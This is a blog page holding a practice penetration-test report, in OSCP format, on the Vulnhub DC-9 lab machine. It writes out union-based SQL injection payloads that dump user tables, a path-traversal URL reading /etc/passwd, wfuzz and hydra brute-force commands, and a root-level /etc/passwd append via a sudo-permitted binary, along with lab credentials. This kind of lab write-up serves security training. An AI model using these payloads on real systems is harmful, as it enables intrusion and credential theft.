@@ -1,0 +1,1123 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="OSCP、vulnhub" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Xiaopan233 Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="临近  OSCP Exam了，做点 Vulnhub 的靶机练练手，顺便也练练 Report 的编写。   靶机地址： https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;dc-9,412&#x2F;    stuck: 1、拿到 LFI 之后，尝试包含 &#x2F;proc&#x2F;self&#x2F;fd getshell 无果。然后就翻了翻攻略。发现了 Linux knockd 这种东西 2、做题的时候没有爆所有的数据库，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OSCP report 练手之 - vulnhub DC-9">
+<meta property="og:url" content="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/index.html">
+<meta property="og:site_name" content="Xiaopan233 Blog">
+<meta property="og:description" content="临近  OSCP Exam了，做点 Vulnhub 的靶机练练手，顺便也练练 Report 的编写。   靶机地址： https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;dc-9,412&#x2F;    stuck: 1、拿到 LFI 之后，尝试包含 &#x2F;proc&#x2F;self&#x2F;fd getshell 无果。然后就翻了翻攻略。发现了 Linux knockd 这种东西 2、做题的时候没有爆所有的数据库，">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/1.png">
+<meta property="og:image" content="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/2.png">
+<meta property="og:image" content="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/3.png">
+<meta property="og:image" content="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/4.png">
+<meta property="og:image" content="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/5.png">
+<meta property="og:image" content="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/6.png">
+<meta property="og:image" content="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/7.png">
+<meta property="og:image" content="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/8.png">
+<meta property="og:image" content="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/9.png">
+<meta property="og:image" content="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/10.png">
+<meta property="og:image" content="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/11.png">
+<meta property="og:image" content="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/12.png">
+<meta property="og:image" content="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/13.png">
+<meta property="og:image" content="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/14.png">
+<meta property="og:image" content="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/15.png">
+<meta property="og:image" content="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/16.png">
+<meta property="og:image" content="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/17.png">
+<meta property="og:image" content="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/18.png">
+<meta property="og:image" content="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/19.png">
+<meta property="og:image" content="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/20.png">
+<meta property="og:image" content="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/21.png">
+<meta property="og:image" content="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/22.png">
+<meta property="article:published_time" content="2021-02-11T03:01:38.000Z">
+<meta property="article:modified_time" content="2021-02-28T12:05:56.769Z">
+<meta property="article:author" content="Xiaopan233">
+<meta property="article:tag" content="OSCP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/"/>
+
+
+
+
+
+  <title>OSCP report 练手之 - vulnhub DC-9 | Xiaopan233 Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Xiaopan233 Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/atom.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Sitemap
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/2020/01/01/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+<script>
+  var server_url = "http://127.0.0.1/blog_v1/blog_v1.php";
+</script>
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiaopan233 Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">OSCP report 练手之 - vulnhub DC-9</h1>
+        
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-02-11T11:01:38+08:00">
+                2021-02-11
+              </time>
+            
+
+            
+
+            
+          </span>
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/OSCP/" itemprop="url" rel="index">
+                    <span itemprop="name">OSCP</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+          
+            
+          
+
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>临近  OSCP Exam了，做点 Vulnhub 的靶机练练手，顺便也练练 Report 的编写。</p>
+<br>
+
+<p>靶机地址：</p>
+<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-9,412/">https://www.vulnhub.com/entry/dc-9,412/</a></p>
+<br>
+
+<p> <strong>stuck:</strong></p>
+<p>1、拿到 LFI 之后，尝试包含 /proc/self/fd getshell 无果。然后就翻了翻攻略。发现了 Linux knockd 这种东西</p>
+<p>2、做题的时候没有爆所有的数据库，只爆了当前库，导致 ssh brute 的时候跑了一万年都没跑出来 = =。翻攻略才发现账号密码在另一个数据库里。</p>
+<br>
+
+<p>OSCP Exam Report 的模板在此：</p>
+<p><a target="_blank" rel="noopener" href="https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf">https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf</a></p>
+<br>
+
+<p>由于 Report 中只有第三节是重点，所以本节就直接仿照第三节来写了。</p>
+<span id="more"></span>
+
+
+
+<br>
+
+<h2 id="3-2-Report-–-Service-Enumeration"><a href="#3-2-Report-–-Service-Enumeration" class="headerlink" title="3.2 Report – Service Enumeration"></a>3.2 Report – Service Enumeration</h2><table>
+<thead>
+<tr>
+<th>Server IP Address</th>
+<th>Ports Open</th>
+<th>Service / Banner</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>192.168.92.167</td>
+<td>22, 80</td>
+<td>ssh / Apache</td>
+</tr>
+</tbody></table>
+<br>
+
+<h2 id="3-3-Report-–-Penetration"><a href="#3-3-Report-–-Penetration" class="headerlink" title="3.3 Report – Penetration"></a>3.3 Report – Penetration</h2><p><strong>Vulnerability Exploited:</strong>  <strong><span style="color:blue">SQL Inject and LFI</span></strong></p>
+<p><strong>System Vulnerable:</strong> 192.168.92.167</p>
+<p><strong>Vulnerability Explanation:</strong> There are one sql inject and a local file inclusion(LFI) vulnerability in this web application. A combination of these vulnerabilities was used to obtain a low privilege shell.</p>
+<p><strong>Privilege Escalation Vulnerability:</strong> Abuse sudo permission</p>
+<p><strong>Vulnerability Fix:</strong> sql syntax filter</p>
+<p><strong>Severity:</strong> <strong><span style="color:red">Critical</span></strong></p>
+<br>
+
+<p><strong>Information Gathering:</strong></p>
+<br>
+
+<p>kali@kali:~/Desktop$ <strong><span style="color:blue">sudo nmap -sV -A 192.168.92.167 -n</span></strong></p>
+<p>……</p>
+<p>PORT  STATE  SERVICE VERSION</p>
+<p><strong><span style="color:red">22/tcp filtered ssh</span></strong></p>
+<p><strong><span style="color:red">80/tcp open   http  Apache httpd 2.4.38 ((Debian))</span></strong></p>
+<p>…..</p>
+<br>
+
+<p><strong>Find a  SQL inject in the port 80 website.url is:</strong></p>
+<p><strong><span style="color:blue"><a target="_blank" rel="noopener" href="http://192.168.92.167/results.php">http://192.168.92.167/results.php</a></span></strong></p>
+<br>
+
+<p><strong>Testing payload:</strong></p>
+<p>‘ or 1=1 #</p>
+<img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/1.png" style="width:800px">
+
+<br>
+
+<p><strong>Get the current database type:</strong></p>
+<p>‘ union select 1,2,3,4,5,(select version()) #</p>
+<img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/2.png" style="width:800px">
+
+<br>
+
+<p><strong>Enum all databases</strong>:</p>
+<p>‘ union select 1,2,3,4,5,(select <span style="color:red">schema_name</span> from information_schema.schemata limit 0,1) #</p>
+<img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/3.png" style="width:800px">
+
+<br>
+
+<p><strong>Change the “limit” value and resend. Get <span style="color:red">three</span> database schemases:</strong></p>
+<p>information_schema</p>
+<p>Staff</p>
+<p>users</p>
+<br>
+
+<p><strong>Check current used database:</strong></p>
+<img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/4.png" style="width:800px">
+
+<br>
+
+<p><strong>Get all tables of current used database:</strong></p>
+<p>‘ union select 1,2,3,4,5,(select <span style="color:red">table_name</span> from information_schema.tables where <span style="color:red">table_schema=database()</span> limit 0,1) #</p>
+<img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/5.png" style="width:800px">
+
+<br>
+
+<p><strong>Change the “limit” value and resend. Get <span style="color:red">two</span> tables:</strong></p>
+<p>StaffDetails</p>
+<p>Users</p>
+<br>
+
+<p><strong>Get all columns in table “Users”</strong></p>
+<p>‘ union select 1,2,3,4,5,(select <span style="color:red">column_name</span> from information_schema.columns where table_schema=database() and table_name=’<span style="color:red">Users</span>‘ limit 0,1) #</p>
+<br>
+
+<p><strong>Change the “limit” value and resend. Get <span style="color:red">three</span> tables:</strong></p>
+<p>UserID</p>
+<p>Username</p>
+<p>Password</p>
+<br>
+
+<p><strong>By above information,We can get the username and password directly by sql inject:</strong></p>
+<p><strong>Payload:</strong></p>
+<p>‘ union select 1,2,3,4,5,(select <span style="color:red">username</span> from Users limit 0,1) #</p>
+<p>‘ union select 1,2,3,4,5,(select <span style="color:red">password</span> from Users limit 0,1) #</p>
+<br>
+
+<p><strong>Get the following information:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>admin</td>
+<td>856f5de590ef37314e7c3bdf6f8a66dc</td>
+</tr>
+</tbody></table>
+<br>
+
+<p><strong>go to the website <a target="_blank" rel="noopener" href="https://www.somd5.com/">https://www.somd5.com/</a> and successful crack the md5 hash,Plaintext is <span style="color:red">transorbital1</span> :</strong></p>
+<img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/6.png" style="width:800px">
+
+<br>
+
+<p><strong>Now we should enum the tables of database “users”. The steps are like the above steps,so I just only the payload here</strong> </p>
+<br>
+
+<p><strong>payload to get all tables of database “users”</strong></p>
+<p>‘ union select 1,2,3,4,5,(select <span style="color:red">table_name</span> from information_schema.tables where table_schema=’<span style="color:red">users</span>‘ limit 0,1) #</p>
+<br>
+
+<p><strong>Get <span style="color:red">one</span> tables:</strong></p>
+<p>UserDetails</p>
+<br>
+
+<p><strong>payload to get all columns of table “UserDetails”, database “users”</strong></p>
+<p>‘ union select 1,2,3,4,5,(select <span style="color:red">column_name</span> from information_schema.columns where <span style="color:red">table_name=’UserDetails’ and table_schema=’users’</span> limit 0,1) #</p>
+<br>
+
+<p><strong>Get <span style="color:red">six</span> columns:</strong></p>
+<p>id</p>
+<p>firstname</p>
+<p>lastname</p>
+<p>username</p>
+<p>password</p>
+<p>reg_date</p>
+<br>
+
+<p><strong>Find an intersting column “password”.Go to “Brup intruder” to fetch all  username and password in table”UserDetails” database “users”</strong></p>
+<p><strong>Payload:</strong></p>
+<p>‘ union select 1,2,3,4,5,(select <span style="color:red">password</span> from users.UserDetails limit §0§,1) #</p>
+<p>‘ union select 1,2,3,4,5,(select <span style="color:red">username</span> from users.UserDetails limit §0§,1) #</p>
+<img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/7.png" style="width:800px">
+
+
+
+<img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/8.png" style="width:800px">
+
+<br>
+
+<p><strong>Get following username and password:</strong></p>
+<p>marym:3kfs86sfd</p>
+<p>julied:468sfdfsd2</p>
+<p>fredf:4sfd87sfd1</p>
+<p>barneyr:RocksOff</p>
+<p>tomc:TC&amp;TheBoyz</p>
+<p>jerrym:B8m#48sd</p>
+<p>wilmaf:Pebbles</p>
+<p>bettyr:BamBam01</p>
+<p>chandlerb:UrAG0D!</p>
+<p>joeyt:Passw0rd</p>
+<p>rachelg:yN72#dsd</p>
+<p>rossg:ILoveRachel</p>
+<p>monicag:3248dsds7s</p>
+<p>phoebeb:smellycats</p>
+<p>scoots:YR3BVxxxw87</p>
+<p>janitor:Ilovepeepee</p>
+<p>janitor2:Hawaii-Five-0</p>
+<br>
+
+<p><strong>Sql inejct finished.Now we logging in target website as user “admin” password “transorbital1”</strong></p>
+<p><strong>Note the line “File does not exits”</strong></p>
+<img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/9.png" style="width:800px">
+
+<br>
+
+<p><strong>Try to use following payload:</strong></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.92.167/manage.php?file=../../../../../etc/passwd">http://192.168.92.167/manage.php?file=../../../../../etc/passwd</a></p>
+<img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/10.png" style="width:800px">
+
+<br>
+
+<p><strong>Brute linux local file:</strong></p>
+<p>wfuzz -u <a target="_blank" rel="noopener" href="http://192.168.92.167/manage.php?file=../../../../..FUZZ">http://192.168.92.167/manage.php?file=../../../../..FUZZ</a> -w Linux_File.txt -b <span style="color:red">“PHPSESSID=an0drpvpbm4gv0e70s99nj5evc”</span> –hh 1341</p>
+<img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/11.png" style="width:800px">
+
+<br>
+
+<p><strong>Find an intersting file “knockd.conf”</strong></p>
+<p><strong>We need request port 7469, port 8475, port 9842 then ssh will be opened.</strong></p>
+<img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/12.png" style="width:800px">
+
+<br>
+
+<p><strong>knockd those ports:</strong></p>
+<img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/13.png" style="width:800px">
+
+<br>
+
+<p><strong>ssh is opened now. Use hydra to brute ssh.username and password dict is the username and password that be got in table “UserDetails”, database “users”</strong></p>
+<p>hydra -C userpass.txt ssh://192.168.92.167 -t 4 -vV</p>
+<img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/14.png" style="width:800px">
+
+<br>
+
+<p><strong>Get three users and passwords:</strong></p>
+<p>login: chandlerb  password: UrAG0D!</p>
+<p>login: joeyt  password: Passw0rd</p>
+<p>login: janitor  password: Ilovepeepee</p>
+<br>
+
+<p><strong>ssh logging in the target as user “janitor”. Find an intersting file in <span style="color:blue">/home/janitor/.secrets-for-putin/passwords-found-on-post-it-notes.txt</span></strong></p>
+<img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/15.png" style="width:800px">
+
+<br>
+
+<p><strong>seems like password for the ohter user.</strong></p>
+<p><strong>Let’s turn to hydra again and brute ssh. password dict is the password in file <span style="color:blue">/home/janitor/.secrets-for-putin/passwords-found-on-post-it-notes.txt</span></strong></p>
+<p>hydra -L user.txt -P pass.txt ssh://192.168.92.167 -t 4</p>
+<img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/16.png" style="width:800px">
+
+<br>
+
+<p><strong>Get one user and password:</strong></p>
+<p>fredf:B4-Tru3-001</p>
+<br>
+
+<p><strong>ssh logging in the target as user “fredf”. Eunmeration for sudo Permissions.</strong></p>
+<img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/17.png" style="width:500px">
+
+<br>
+
+<p><strong>Try to run this executable file.</strong></p>
+<img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/18.png" style="width:500px">
+
+<br>
+
+<p><strong>Testing the feature “append” of this executable file</strong></p>
+<img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/19.png" style="width:500px">
+
+<br>
+
+<p><strong>Try to append a new line to  /etc/passwd</strong></p>
+<p>fredf@dc-9:~/app$<span style="color:blue"> echo ‘panpan:zZoY87S9mdtnk:0:0:root:/root:/bin/bash’ &gt; 6.txt</span></p>
+<p>fredf@dc-9:~/app$ <span style="color:blue">sudo /opt/devstuff/dist/test/test 6.txt /etc/passwd</span></p>
+<br>
+
+<p><strong>cat /etc/passwd</strong></p>
+<img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/20.png" style="width:500px">
+
+<br>
+
+<p><strong>su panpan</strong></p>
+<img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/21.png" style="width:500px">
+
+<br>
+
+<p><strong>Proof file:</strong></p>
+<img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/22.png" style="width:800px">
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/OSCP/" rel="tag"># OSCP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/02/08/2021-02-08-mysql-load-data/" rel="next" title="Rogue Mysql Server 简单分析">
+                <i class="fa fa-chevron-left"></i> Rogue Mysql Server 简单分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/" rel="prev" title="OSCP report 练手之 - vulnhub development-improved">
+                OSCP report 练手之 - vulnhub development-improved <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/xiaopan233" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://forum.butian.net/people/483" target="_blank" title="奇安信攻防社区">
+                      
+                        <i class="fa fa-fw fa-globe"></i>奇安信攻防社区</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.anquanke.com/member.html?memberId=144071" target="_blank" title="安全客">
+                      
+                        <i class="fa fa-fw fa-globe"></i>安全客</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.freebuf.com/author/xiaopan233" target="_blank" title="Freebuf">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Freebuf</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/xiaopan233/" target="_blank" title="CSDN">
+                      
+                        <i class="fa fa-fw fa-globe"></i>CSDN</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hui3c.club/" title="Hui3c 窝" target="_blank">Hui3c 窝</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.noerrorp.com/" title="YouGe的技术笔记" target="_blank">YouGe的技术笔记</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.jingqingg.com/" title="惊青の小窝" target="_blank">惊青の小窝</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.luolingjiang.com/" title="洛翎酱的小窝" target="_blank">洛翎酱的小窝</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-Report-%E2%80%93-Service-Enumeration"><span class="nav-number">1.</span> <span class="nav-text">3.2 Report – Service Enumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-3-Report-%E2%80%93-Penetration"><span class="nav-number">2.</span> <span class="nav-text">3.3 Report – Penetration</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xiaopan233</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
